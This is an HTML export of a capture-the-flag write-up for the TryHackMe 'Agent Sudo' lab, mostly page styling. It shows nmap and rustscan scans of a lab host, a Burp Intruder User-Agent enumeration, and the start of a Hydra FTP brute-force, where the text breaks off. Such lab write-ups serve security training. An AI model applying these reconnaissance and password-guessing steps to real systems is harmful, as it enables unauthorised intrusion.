@@ -1,0 +1,667 @@
+<html><head><meta http-equiv="Content-Type" content="text/html; charset=utf-8"/><title>Agent Sudo CTF Writeup</title><style>
+/* cspell:disable-file */
+/* webkit printing magic: print all background colors */
+html {
+	-webkit-print-color-adjust: exact;
+}
+* {
+	box-sizing: border-box;
+	-webkit-print-color-adjust: exact;
+}
+
+html,
+body {
+	margin: 0;
+	padding: 0;
+}
+
+body {
+	line-height: 1.5;
+	white-space: pre-wrap;
+}
+
+a,
+a.visited {
+	color: inherit;
+	text-decoration: underline;
+}
+
+.pdf-relative-link-path {
+	font-size: 80%;
+}
+
+h1,
+h2,
+h3 {
+	letter-spacing: -0.01em;
+	line-height: 1.2;
+	font-weight: 600;
+	margin-bottom: 0;
+}
+
+.page-title {
+	font-size: 2.5rem;
+	font-weight: 700;
+	margin-top: 0;
+	margin-bottom: 0.75em;
+}
+
+h1 {
+	font-size: 1.875rem;
+	margin-top: 1.875rem;
+}
+
+h2 {
+	font-size: 1.5rem;
+	margin-top: 1.5rem;
+}
+
+h3 {
+	font-size: 1.25rem;
+	margin-top: 1.25rem;
+}
+
+.source {
+	border: 1px solid #ddd;
+	border-radius: 3px;
+	padding: 1.5em;
+	word-break: break-all;
+}
+
+.callout {
+	border-radius: 3px;
+	padding: 1rem;
+}
+
+figure {
+	margin: 1.25em 0;
+	page-break-inside: avoid;
+}
+
+figcaption {
+	opacity: 0.5;
+	font-size: 85%;
+	margin-top: 0.5em;
+}
+
+mark {
+	background-color: transparent;
+}
+
+.indented {
+	padding-left: 1.5em;
+}
+
+hr {
+	background: transparent;
+	display: block;
+	width: 100%;
+	height: 1px;
+	visibility: visible;
+	border: none;
+	border-bottom: 1px solid rgba(55, 53, 47, 0.09);
+}
+
+img {
+	max-width: 100%;
+}
+
+@media only print {
+	img {
+		max-height: 100vh;
+		object-fit: contain;
+	}
+}
+
+
+
+.collection-content {
+	font-size: 0.875rem;
+}
+
+.column-list {
+	display: flex;
+	justify-content: space-between;
+}
+
+.column {
+	padding: 0 1em;
+}
+
+.column:first-child {
+	padding-left: 0;
+}
+
+.column:last-child {
+	padding-right: 0;
+}
+
+.table_of_contents-item {
+	display: block;
+	font-size: 0.875rem;
+	line-height: 1.3;
+	padding: 0.125rem;
+}
+
+.table_of_contents-indent-1 {
+	margin-left: 1.5rem;
+}
+
+.table_of_contents-indent-2 {
+	margin-left: 3rem;
+}
+
+.table_of_contents-indent-3 {
+	margin-left: 4.5rem;
+}
+
+.table_of_contents-link {
+	text-decoration: none;
+	opacity: 0.7;
+	border-bottom: 1px solid rgba(55, 53, 47, 0.18);
+}
+
+table,
+th,
+td {
+	border: 1px solid rgba(55, 53, 47, 0.09);
+	border-collapse: collapse;
+}
+
+table {
+	border-left: none;
+	border-right: none;
+}
+
+th,
+td {
+	font-weight: normal;
+	padding: 0.25em 0.5em;
+	line-height: 1.5;
+	min-height: 1.5em;
+	text-align: left;
+}
+
+th {
+	color: rgba(55, 53, 47, 0.6);
+}
+
+ol,
+ul {
+	margin: 0;
+	margin-block-start: 0.6em;
+	margin-block-end: 0.6em;
+}
+
+li > ol:first-child,
+li > ul:first-child {
+	margin-block-start: 0.6em;
+}
+
+ul > li {
+	list-style: disc;
+}
+
+ul.to-do-list {
+	padding-inline-start: 0;
+}
+
+ul.to-do-list > li {
+	list-style: none;
+}
+
+.to-do-children-checked {
+	text-decoration: line-through;
+	opacity: 0.375;
+}
+
+ul.toggle > li {
+	list-style: none;
+}
+
+ul {
+	padding-inline-start: 1.7em;
+}
+
+ul > li {
+	padding-left: 0.1em;
+}
+
+ol {
+	padding-inline-start: 1.6em;
+}
+
+ol > li {
+	padding-left: 0.2em;
+}
+
+.mono ol {
+	padding-inline-start: 2em;
+}
+
+.mono ol > li {
+	text-indent: -0.4em;
+}
+
+.toggle {
+	padding-inline-start: 0em;
+	list-style-type: none;
+}
+
+/* Indent toggle children */
+.toggle > li > details {
+	padding-left: 1.7em;
+}
+
+.toggle > li > details > summary {
+	margin-left: -1.1em;
+}
+
+.selected-value {
+	display: inline-block;
+	padding: 0 0.5em;
+	background: rgba(206, 205, 202, 0.5);
+	border-radius: 3px;
+	margin-right: 0.5em;
+	margin-top: 0.3em;
+	margin-bottom: 0.3em;
+	white-space: nowrap;
+}
+
+.collection-title {
+	display: inline-block;
+	margin-right: 1em;
+}
+
+.page-description {
+    margin-bottom: 2em;
+}
+
+.simple-table {
+	margin-top: 1em;
+	font-size: 0.875rem;
+	empty-cells: show;
+}
+.simple-table td {
+	height: 29px;
+	min-width: 120px;
+}
+
+.simple-table th {
+	height: 29px;
+	min-width: 120px;
+}
+
+.simple-table-header-color {
+	background: rgb(247, 246, 243);
+	color: black;
+}
+.simple-table-header {
+	font-weight: 500;
+}
+
+time {
+	opacity: 0.5;
+}
+
+.icon {
+	display: inline-block;
+	max-width: 1.2em;
+	max-height: 1.2em;
+	text-decoration: none;
+	vertical-align: text-bottom;
+	margin-right: 0.5em;
+}
+
+img.icon {
+	border-radius: 3px;
+}
+
+.user-icon {
+	width: 1.5em;
+	height: 1.5em;
+	border-radius: 100%;
+	margin-right: 0.5rem;
+}
+
+.user-icon-inner {
+	font-size: 0.8em;
+}
+
+.text-icon {
+	border: 1px solid #000;
+	text-align: center;
+}
+
+.page-cover-image {
+	display: block;
+	object-fit: cover;
+	width: 100%;
+	max-height: 30vh;
+}
+
+.page-header-icon {
+	font-size: 3rem;
+	margin-bottom: 1rem;
+}
+
+.page-header-icon-with-cover {
+	margin-top: -0.72em;
+	margin-left: 0.07em;
+}
+
+.page-header-icon img {
+	border-radius: 3px;
+}
+
+.link-to-page {
+	margin: 1em 0;
+	padding: 0;
+	border: none;
+	font-weight: 500;
+}
+
+p > .user {
+	opacity: 0.5;
+}
+
+td > .user,
+td > time {
+	white-space: nowrap;
+}
+
+input[type="checkbox"] {
+	transform: scale(1.5);
+	margin-right: 0.6em;
+	vertical-align: middle;
+}
+
+p {
+	margin-top: 0.5em;
+	margin-bottom: 0.5em;
+}
+
+.image {
+	border: none;
+	margin: 1.5em 0;
+	padding: 0;
+	border-radius: 0;
+	text-align: center;
+}
+
+.code,
+code {
+	background: rgb(252, 252, 252);
+	border-radius: 3px;
+	padding: 0.2em 0.4em;
+	border-radius: 3px;
+	font-size: 85%;
+	tab-size: 2;
+}
+
+code {
+	color: #eb5757;
+}
+
+.code {
+	padding: 1.5em 1em;
+}
+
+.code-wrap {
+	white-space: pre-wrap;
+	word-break: break-all;
+}
+
+.code > code {
+	background: none;
+	padding: 0;
+	font-size: 100%;
+	color: inherit;
+}
+
+blockquote {
+	font-size: 1.25em;
+	margin: 1em 0;
+	padding-left: 1em;
+	border-left: 3px solid rgb(55, 53, 47);
+}
+
+.bookmark {
+	text-decoration: none;
+	max-height: 8em;
+	padding: 0;
+	display: flex;
+	width: 100%;
+	align-items: stretch;
+}
+
+.bookmark-title {
+	font-size: 0.85em;
+	overflow: hidden;
+	text-overflow: ellipsis;
+	height: 1.75em;
+	white-space: nowrap;
+}
+
+.bookmark-text {
+	display: flex;
+	flex-direction: column;
+}
+
+.bookmark-info {
+	flex: 4 1 180px;
+	padding: 12px 14px 14px;
+	display: flex;
+	flex-direction: column;
+	justify-content: space-between;
+}
+
+.bookmark-image {
+	width: 33%;
+	flex: 1 1 180px;
+	display: block;
+	position: relative;
+	object-fit: cover;
+	border-radius: 1px;
+}
+
+.bookmark-description {
+	color: rgba(55, 53, 47, 0.6);
+	font-size: 0.75em;
+	overflow: hidden;
+	max-height: 4.5em;
+	word-break: break-word;
+}
+
+.bookmark-href {
+	font-size: 0.75em;
+	margin-top: 0.25em;
+}
+
+.sans { font-family: ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol"; }
+.code { font-family: "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace; }
+.serif { font-family: Lyon-Text, Georgia, ui-serif, serif; }
+.mono { font-family: iawriter-mono, Nitti, Menlo, Courier, monospace; }
+.pdf .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK JP'; }
+.pdf:lang(zh-CN) .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK SC'; }
+.pdf:lang(zh-TW) .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK TC'; }
+.pdf:lang(ko-KR) .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK KR'; }
+.pdf .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK JP'; }
+.pdf:lang(zh-CN) .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK SC'; }
+.pdf:lang(zh-TW) .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK TC'; }
+.pdf:lang(ko-KR) .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK KR'; }
+.pdf .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK JP'; }
+.pdf:lang(zh-CN) .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK SC'; }
+.pdf:lang(zh-TW) .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK TC'; }
+.pdf:lang(ko-KR) .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK KR'; }
+.pdf .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK JP'; }
+.pdf:lang(zh-CN) .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK SC'; }
+.pdf:lang(zh-TW) .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK TC'; }
+.pdf:lang(ko-KR) .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK KR'; }
+.highlight-default {
+	color: rgba(55, 53, 47, 1);
+}
+.highlight-gray {
+	color: rgba(120, 119, 116, 1);
+	fill: rgba(120, 119, 116, 1);
+}
+.highlight-brown {
+	color: rgba(159, 107, 83, 1);
+	fill: rgba(159, 107, 83, 1);
+}
+.highlight-orange {
+	color: rgba(217, 115, 13, 1);
+	fill: rgba(217, 115, 13, 1);
+}
+.highlight-yellow {
+	color: rgba(203, 145, 47, 1);
+	fill: rgba(203, 145, 47, 1);
+}
+.highlight-teal {
+	color: rgba(68, 131, 97, 1);
+	fill: rgba(68, 131, 97, 1);
+}
+.highlight-blue {
+	color: rgba(51, 126, 169, 1);
+	fill: rgba(51, 126, 169, 1);
+}
+.highlight-purple {
+	color: rgba(144, 101, 176, 1);
+	fill: rgba(144, 101, 176, 1);
+}
+.highlight-pink {
+	color: rgba(193, 76, 138, 1);
+	fill: rgba(193, 76, 138, 1);
+}
+.highlight-red {
+	color: rgba(212, 76, 71, 1);
+	fill: rgba(212, 76, 71, 1);
+}
+.highlight-gray_background {
+	background: rgba(241, 241, 239, 1);
+}
+.highlight-brown_background {
+	background: rgba(244, 238, 238, 1);
+}
+.highlight-orange_background {
+	background: rgba(251, 236, 221, 1);
+}
+.highlight-yellow_background {
+	background: rgba(251, 243, 219, 1);
+}
+.highlight-teal_background {
+	background: rgba(237, 243, 236, 1);
+}
+.highlight-blue_background {
+	background: rgba(231, 243, 248, 1);
+}
+.highlight-purple_background {
+	background: rgba(244, 240, 247, 0.8);
+}
+.highlight-pink_background {
+	background: rgba(249, 238, 243, 0.8);
+}
+.highlight-red_background {
+	background: rgba(253, 235, 236, 1);
+}
+.block-color-default {
+	color: inherit;
+	fill: inherit;
+}
+.block-color-gray {
+	color: rgba(120, 119, 116, 1);
+	fill: rgba(120, 119, 116, 1);
+}
+.block-color-brown {
+	color: rgba(159, 107, 83, 1);
+	fill: rgba(159, 107, 83, 1);
+}
+.block-color-orange {
+	color: rgba(217, 115, 13, 1);
+	fill: rgba(217, 115, 13, 1);
+}
+.block-color-yellow {
+	color: rgba(203, 145, 47, 1);
+	fill: rgba(203, 145, 47, 1);
+}
+.block-color-teal {
+	color: rgba(68, 131, 97, 1);
+	fill: rgba(68, 131, 97, 1);
+}
+.block-color-blue {
+	color: rgba(51, 126, 169, 1);
+	fill: rgba(51, 126, 169, 1);
+}
+.block-color-purple {
+	color: rgba(144, 101, 176, 1);
+	fill: rgba(144, 101, 176, 1);
+}
+.block-color-pink {
+	color: rgba(193, 76, 138, 1);
+	fill: rgba(193, 76, 138, 1);
+}
+.block-color-red {
+	color: rgba(212, 76, 71, 1);
+	fill: rgba(212, 76, 71, 1);
+}
+.block-color-gray_background {
+	background: rgba(241, 241, 239, 1);
+}
+.block-color-brown_background {
+	background: rgba(244, 238, 238, 1);
+}
+.block-color-orange_background {
+	background: rgba(251, 236, 221, 1);
+}
+.block-color-yellow_background {
+	background: rgba(251, 243, 219, 1);
+}
+.block-color-teal_background {
+	background: rgba(237, 243, 236, 1);
+}
+.block-color-blue_background {
+	background: rgba(231, 243, 248, 1);
+}
+.block-color-purple_background {
+	background: rgba(244, 240, 247, 0.8);
+}
+.block-color-pink_background {
+	background: rgba(249, 238, 243, 0.8);
+}
+.block-color-red_background {
+	background: rgba(253, 235, 236, 1);
+}
+.select-value-color-uiBlue { background-color: rgba(35, 131, 226, .07); }
+.select-value-color-pink { background-color: rgba(245, 224, 233, 1); }
+.select-value-color-purple { background-color: rgba(232, 222, 238, 1); }
+.select-value-color-green { background-color: rgba(219, 237, 219, 1); }
+.select-value-color-gray { background-color: rgba(227, 226, 224, 1); }
+.select-value-color-transparentGray { background-color: rgba(227, 226, 224, 0); }
+.select-value-color-translucentGray { background-color: rgba(255, 255, 255, 0.0375); }
+.select-value-color-orange { background-color: rgba(250, 222, 201, 1); }
+.select-value-color-brown { background-color: rgba(238, 224, 218, 1); }
+.select-value-color-red { background-color: rgba(255, 226, 221, 1); }
+.select-value-color-yellow { background-color: rgba(253, 236, 200, 1); }
+.select-value-color-blue { background-color: rgba(211, 229, 239, 1); }
+.select-value-color-pageGlass { background-color: undefined; }
+.select-value-color-washGlass { background-color: undefined; }
+
+.checkbox {
+	display: inline-flex;
+	vertical-align: text-bottom;
+	width: 16;
+	height: 16;
+	background-size: 16px;
+	margin-left: 2px;
+	margin-right: 5px;
+}
+
+.checkbox-on {
+	background-image: url("data:image/svg+xml;charset=UTF-8,%3Csvg%20width%3D%2216%22%20height%3D%2216%22%20viewBox%3D%220%200%2016%2016%22%20fill%3D%22none%22%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%3E%0A%3Crect%20width%3D%2216%22%20height%3D%2216%22%20fill%3D%22%2358A9D7%22%2F%3E%0A%3Cpath%20d%3D%22M6.71429%2012.2852L14%204.9995L12.7143%203.71436L6.71429%209.71378L3.28571%206.2831L2%207.57092L6.71429%2012.2852Z%22%20fill%3D%22white%22%2F%3E%0A%3C%2Fsvg%3E");
+}
+
+.checkbox-off {
+	background-image: url("data:image/svg+xml;charset=UTF-8,%3Csvg%20width%3D%2216%22%20height%3D%2216%22%20viewBox%3D%220%200%2016%2016%22%20fill%3D%22none%22%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%3E%0A%3Crect%20x%3D%220.75%22%20y%3D%220.75%22%20width%3D%2214.5%22%20height%3D%2214.5%22%20fill%3D%22white%22%20stroke%3D%22%2336352F%22%20stroke-width%3D%221.5%22%2F%3E%0A%3C%2Fsvg%3E");
+}
+	
+</style></head><body><article id="8351ac91-c6d9-4985-b939-e278c7d15e59" class="page sans"><header><h1 class="page-title">Agent Sudo CTF Writeup</h1><p class="page-description"></p></header><div class="page-body"><p id="7d57ec9e-34e2-4803-ac59-955d3d9bf43f" class="">Link: <a href="https://tryhackme.com/r/room/agentsudoctf">https://tryhackme.com/r/room/agentsudoctf</a></p><nav id="850f6d93-73ab-4f8b-9699-ea6c241beee3" class="table_of_contents"><div class="table_of_contents-item table_of_contents-indent-0"><a class="table_of_contents-link" href="#baacde71-d68b-47d8-a677-12b1bc9453bb">Enumerate</a></div><div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link" href="#762eb135-0060-4136-bdd1-d03ba9f73690">How many open ports?</a></div><div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link" href="#c64a4f75-f44c-4231-9e06-18f2805e506f">How to redirect yourself to a secret page?</a></div><div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link" href="#1122ec5a-5514-4595-99b3-16fe468636a0">What is the agent name?</a></div><div class="table_of_contents-item table_of_contents-indent-0"><a class="table_of_contents-link" href="#8a6f8108-10d0-416b-8c1e-552d7a5c72ee">Hash cracking and brute-force</a></div><div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link" href="#26ee7c54-ccad-4fd6-89ac-262e211c7b60">FTP password</a></div><div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link" href="#a7c2d8ec-e553-45c4-a1be-05a7f55c63d5">Zip file password</a></div><div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link" href="#1b9ed60a-3658-4ba9-b00c-49b3455912f7">steg password</a></div><div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link" href="#860213be-de45-41ac-9f29-a936d449b015">Who is the other agent (in full name)?</a></div><div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link" href="#5fd6007e-b626-454a-b9cf-e453886ef809">SSH password</a></div><div class="table_of_contents-item table_of_contents-indent-0"><a class="table_of_contents-link" href="#f2f02c51-35fb-455e-bc7c-ec13ac0263e6">Capture the user flag</a></div><div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link" href="#e529eb59-1cc5-4da3-a421-f4dc959c034f">What is the user flag?</a></div><div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link" href="#17fa5d70-7215-4caa-be31-d37e4f3d31a8">What is the incident of the photo called?</a></div><div class="table_of_contents-item table_of_contents-indent-0"><a class="table_of_contents-link" href="#2da2dadb-871b-44eb-8797-eaac9d009f87">Privilege escalation</a></div><div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link" href="#f1a97b63-14b1-4bf7-a86f-2edc205504c4">CVE number for the escalation</a></div><div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link" href="#b1dda4ff-612c-4262-bd37-0c446106738a">What is the root flag?</a></div><div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link" href="#2001449a-9521-4af4-9807-da12b3121a3b">(Bonus) Who is Agent R?</a></div></nav><h1 id="baacde71-d68b-47d8-a677-12b1bc9453bb" class="">Enumerate</h1><h2 id="762eb135-0060-4136-bdd1-d03ba9f73690" class="">How many open ports?</h2><p id="8546ff77-1293-4769-8066-a7c487f8bb11" class="">To scan for open ports I’m going to use rustscan to find all the open ports, and then pass these ports into nmap for further information on the services running on those ports.</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="ef2a6bec-638e-4e93-af55-5c9197453889" class="code"><code class="language-Bash" style="white-space:pre-wrap;word-break:break-all">rustscan --ulimit 5000 -a 10.10.32.11</code></pre><figure id="2ad96c54-d929-4aa4-98ad-bba265215e9d" class="image"><a href="/ctf/Agent%20Sudo%20CTF%20Writeup%208351ac91c6d94985b939e278c7d15e59/Untitled%201.png"><img style="width:156px" src="/ctf/Agent%20Sudo%20CTF%20Writeup%208351ac91c6d94985b939e278c7d15e59/Untitled%201.png"/></a></figure><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="48b40dfc-cf46-4160-b233-a7365b8de194" class="code"><code class="language-Bash" style="white-space:pre-wrap;word-break:break-all">sudo nmap -vv -oA scan-script -p21,22,80 -sC -sV 10.10.32.11</code></pre><ul id="55d233d0-387f-4c7a-83da-d0b424f62d78" class="bulleted-list"><li style="list-style-type:disc">-vv - Verbose output</li></ul><ul id="6d1865ea-cbf3-426e-9bb2-61ae887820c6" class="bulleted-list"><li style="list-style-type:disc">-oA - Output to three common filetypes</li></ul><ul id="58204f98-980e-4944-8135-a7b638ba80a1" class="bulleted-list"><li style="list-style-type:disc">-p - List of ports to scan</li></ul><ul id="3fff7c92-35ad-405e-9b62-e5872f454105" class="bulleted-list"><li style="list-style-type:disc">-sC - Executes some default scripts</li></ul><ul id="4451f2b2-8d27-44c4-944e-876dda4fe332" class="bulleted-list"><li style="list-style-type:disc">-sV - Probe open ports to determine version number</li></ul><figure id="37f52d80-200f-4307-b2cc-3583d8e8cfb1" class="image"><a href="/ctf/Agent%20Sudo%20CTF%20Writeup%208351ac91c6d94985b939e278c7d15e59/Untitled%202.png"><img style="width:708px" src="/ctf/Agent%20Sudo%20CTF%20Writeup%208351ac91c6d94985b939e278c7d15e59/Untitled%202.png"/></a></figure><p id="74b3678d-5090-4fd4-8e82-e4f8d55c3ba2" class="">So in total <strong>3 ports </strong>were found, with the services</p><ul id="53d5048b-8271-47ad-8fc3-9d4089515bd1" class="bulleted-list"><li style="list-style-type:disc">FTP</li></ul><ul id="946192cf-0e2e-4452-8c52-051c92d18523" class="bulleted-list"><li style="list-style-type:disc">SSH</li></ul><ul id="b6eed18c-abae-44dd-a326-5aa106ee60e9" class="bulleted-list"><li style="list-style-type:disc">HTTP</li></ul><p id="a0e84c2f-971c-4ddb-920b-1235499cabae" class="">running on the server.</p><h2 id="c64a4f75-f44c-4231-9e06-18f2805e506f" class="">How to redirect yourself to a secret page?</h2><p id="f9c1ebdb-1094-4fe8-87ea-ee1e6e04ff94" class="">This question implies the need to start searching the HTTP web page.</p><figure id="f3b814b8-69b3-4b38-8f7d-3c97d34320de" class="image"><a href="/ctf/Agent%20Sudo%20CTF%20Writeup%208351ac91c6d94985b939e278c7d15e59/Untitled%203.png"><img style="width:480px" src="/ctf/Agent%20Sudo%20CTF%20Writeup%208351ac91c6d94985b939e278c7d15e59/Untitled%203.png"/></a></figure><p id="8355854c-4355-44c5-a50c-700668bb98da" class="">The home page for the site gives us this message. It mentions how we need to alter our <strong>User-Agent </strong>to gain access to the site.</p><h2 id="1122ec5a-5514-4595-99b3-16fe468636a0" class="">What is the agent name?</h2><p id="96ea2bf2-93a9-4c90-8f71-6b89197bfdf2" class="">To alter our user-agent, I’m going to use BurpSuite.</p><p id="318b3842-045b-4188-aca1-525f2cd72a30" class="">After visiting the webpage in the BurpSuite browser, we send the request to the Repeater so we can edit the user-agent and then send a request.</p><figure id="4eff8dc4-f25d-4b51-98b3-3de5563e6b76" class="image"><a href="/ctf/Agent%20Sudo%20CTF%20Writeup%208351ac91c6d94985b939e278c7d15e59/Untitled%204.png"><img style="width:708px" src="/ctf/Agent%20Sudo%20CTF%20Writeup%208351ac91c6d94985b939e278c7d15e59/Untitled%204.png"/></a></figure><p id="f614f829-0d8d-4c3d-bdf3-dcca10898ec3" class="">As the message on the home page is from an Agent R. It seems to imply the codename is going to be a single character.</p><figure id="bccc71eb-129d-4475-98a2-7ddfdd1ef4e8" class="image"><a href="/ctf/Agent%20Sudo%20CTF%20Writeup%208351ac91c6d94985b939e278c7d15e59/Untitled%205.png"><img style="width:708px" src="/ctf/Agent%20Sudo%20CTF%20Writeup%208351ac91c6d94985b939e278c7d15e59/Untitled%205.png"/></a></figure><p id="9ec5e9a7-d958-4c38-b617-de9357d87655" class="">This is further proven when trying to access as Agent R, using R as the user-agent.</p><p id="8f26c316-293a-42d0-94a7-e47ab73bc984" class="">To automate this search, we can send the request to the Intruder (CTRL + I)</p><figure id="daddd986-4a5e-4c89-a5e0-94a19a237dd5" class="image"><a href="/ctf/Agent%20Sudo%20CTF%20Writeup%208351ac91c6d94985b939e278c7d15e59/Untitled%206.png"><img style="width:708px" src="/ctf/Agent%20Sudo%20CTF%20Writeup%208351ac91c6d94985b939e278c7d15e59/Untitled%206.png"/></a></figure><p id="aba329ef-332f-4bd2-b5c3-e3a2c7e07dcf" class="">We enclose our User-Agent with $$ and then set the Payloads.</p><figure id="0bfc0d54-9932-47ca-8225-63fe661ef6d4" class="image"><a href="/ctf/Agent%20Sudo%20CTF%20Writeup%208351ac91c6d94985b939e278c7d15e59/Untitled%207.png"><img style="width:538px" src="/ctf/Agent%20Sudo%20CTF%20Writeup%208351ac91c6d94985b939e278c7d15e59/Untitled%207.png"/></a></figure><p id="71e585e5-2229-4aba-8f56-ce47501fb73a" class="">We create a list of characters from A-Z, excluding R as we already know what that does.</p><p id="c232eae7-532c-4de4-aa00-9eee10e8d709" class="">Then press Start attack.</p><figure id="b55f6156-73c7-426e-982e-b2999455444f" class="image"><a href="/ctf/Agent%20Sudo%20CTF%20Writeup%208351ac91c6d94985b939e278c7d15e59/Untitled%208.png"><img style="width:708px" src="/ctf/Agent%20Sudo%20CTF%20Writeup%208351ac91c6d94985b939e278c7d15e59/Untitled%208.png"/></a></figure><p id="4237ffc1-1a9b-4bf6-863b-3fe748f950ce" class="">When looking over the list of responses received, using C is the only time we get a 302 status code (Redirection). We can explore the response of this request to see where it wanted to redirect us to.</p><figure id="53d67883-a927-4678-927c-efaa9f223452" class="image"><a href="/ctf/Agent%20Sudo%20CTF%20Writeup%208351ac91c6d94985b939e278c7d15e59/Untitled%209.png"><img style="width:317px" src="/ctf/Agent%20Sudo%20CTF%20Writeup%208351ac91c6d94985b939e278c7d15e59/Untitled%209.png"/></a></figure><p id="031fa7db-c3f6-424d-b46b-b62bec17d354" class="">It was trying to redirect us to agent_C_attention.php</p><p id="c72260d9-5361-4533-8fd9-9941e54294e6" class="">We can use this as a path to visit the webpage.</p><figure id="f8796c6c-ebcc-4860-a3b3-6cae45f7ae30" class="image"><a href="/ctf/Agent%20Sudo%20CTF%20Writeup%208351ac91c6d94985b939e278c7d15e59/Untitled%2010.png"><img style="width:708px" src="/ctf/Agent%20Sudo%20CTF%20Writeup%208351ac91c6d94985b939e278c7d15e59/Untitled%2010.png"/></a></figure><p id="9a6aaab1-d2a5-41a6-9fe3-772b2d1d8388" class="">This gives us the Agent’s name <strong>chris</strong></p><h1 id="8a6f8108-10d0-416b-8c1e-552d7a5c72ee" class="">Hash cracking and brute-force</h1><h2 id="26ee7c54-ccad-4fd6-89ac-262e211c7b60" class="">FTP password</h2><p id="32b07e28-2ca1-44ab-a273-19bebaa3a7c1" class="">With the message received at agent_C_attention.php Agent R is complaining that chris’ password is weak. Therefore we can try and brute force FTP credentials as chris, using Hydra.</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" 